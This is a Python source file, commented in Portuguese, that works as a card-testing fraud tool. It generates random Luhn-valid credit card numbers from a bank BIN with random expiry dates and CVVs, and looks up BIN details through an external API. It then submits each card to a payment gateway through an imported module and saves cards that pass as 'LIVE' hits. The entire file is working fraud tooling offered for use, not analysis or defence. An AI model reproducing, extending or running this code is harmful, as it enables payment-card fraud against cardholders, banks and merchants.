#!/usr/bin/ python
# -*- coding: utf-8 -*-
#
# Autor:    p0isonBR
# GitHub:   https://github.com/p0isonBR
# Email:    poisonbr@pm.me
# Contato:  https://t.me/p0isonBR
# 
# Apoie meu trabalho: pix 04a06b5f-9036-47aa-9611-445b7c5e1246
# 
# -There is not knowledge that is not power-

import requests
import random
import gateOne
import banner

R = '\033[1;31m'
B = '\033[1;34m'
C = '\033[1;90m'
Y = '\033[1;33m'
G = '\033[1;32m'
RT = '\033[0;1m'


def ccGen(bankbin, mes, ano, gate, qt):
    ccn = bankbin
    new_ccn = list()
    newccn = str()
    gatereturn = str()

    for _ in range(len(ccn)):
        if ccn[_] == 'x':
            new_ccn.append(str(random.randint(0, 9)))

        else:
            new_ccn.append(ccn[_])

        newccn = ''.join(new_ccn)
    cvv = str(random.randint(0, 999))

    if len(cvv) != 3:
        n = 3 - len(cvv)
        cvv = '0' * n + cvv

    gg = '|'.join([newccn, mes, ano, cvv])

    if luhn_valid(gg):
        contador = int(open('.contador', 'r').read())

        if contador == qt:
            return True

        print(
            C + gg.replace('|', ' ') +
            f'{G} Luhn checksum OK!{RT}\nResposta da gateway: ' + Y, end=''
        )

        open('.contador', 'w').write(str(contador + 1))

        if gg.split('|')[0] in open('lives.txt', 'r').read():
            print(Y + 'Cartao ja checado! Pulando teste.\n' + RT)

        else:
            if gate == '1':
                gatereturn = gateOne.code(gg)

            if gatereturn:
                open('lives.txt', 'a+').writelines(gg + '\n')
                print(f'{G}Cartao LIVE!{RT}\n')


def lockUp(bankbin):
    lockup = requests.get(
        'https://bins-su-api.vercel.app/api/' + bankbin[0:6]
    ).json()

    return lockup


def luhn_checksum(gg):
    ccn = gg.split('|')[0]

    def digits_of(n):
        return [int(d) for d in str(n)]

    digits = digits_of(ccn)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = 0
    checksum += sum(odd_digits)

    for d in even_digits:
        checksum += sum(digits_of(d * 2))

    return checksum % 10


def luhn_valid(ccn):
    return luhn_checksum(ccn) == 0


def main():
    bankbin = input(RT + 'Bin ou matriz (apenas CCN): ' + B)

    if len(bankbin) > 16:
        bankbin = bankbin[:16]

    elif len(bankbin) < 16:
        sm = 16 - len(bankbin)
        bankbin = bankbin + 'x' * sm

    mes = input(RT + 'Mes (enter para aleatorio): ' + B)

    if len(mes) == 0 or int(mes) not in range(13):
        mes = str(random.randint(1, 12))
        if len(mes) != 2:
            mes = '0' + mes

    ano = input(RT + 'Ano (enter para aleatorio): ' + B)

    if len(ano) == 2 and int(ano) > 21:
        ano = '20' + ano

    else:
        ano = str(random.randint(2021, 2026))

    print()

    for key, value in lockUp(bankbin[0:6])['data'].items():
        print(f'{B}{key}: {C}{value}')

    gate = gateway()

    qt = int(input(RT + '\nQuantidade a gerar: ' + B))

    print(RT + 'Testando cartoes gerados:\n' + RT)

    lives = len(open('lives.txt', 'r').read().splitlines())

    while True:
        if ccGen(bankbin, mes, ano, gate, qt):
            break

    livesnew = len(open('lives.txt', 'r').read().splitlines())

    print(
        RT + 'Concluido: ' + G + str(qt) + RT + ' Cartoes testados, ' + G
        + str(livesnew - lives) + ' Lives!'
    )


def gateway():
    print(RT + '\nGateways disponiveis:\n')

    print(f'[{G}1{RT}] Gateway 1: ')  # Numero representacao da gateway

    gate = input(
        RT + '\nSelecione a Gateway de pagamento (enter para aleatorio): ' + B
    )
    if len(gate) < 1:
        gate = random.choice(['1'])

    while gate not in ['1'] or not gate.isdigit():
        gate = input(Y + 'Selecione uma gate valida: ' + B)

    return gate


if __name__ == '__main__':
    open('.contador', 'w').write('0')

    try:
        print(banner.cc)
        main()

    except KeyboardInterrupt:
        exit(R + '\nSaindo')

    except Exception as e:
        exit(R + f'\nErro: {e}')
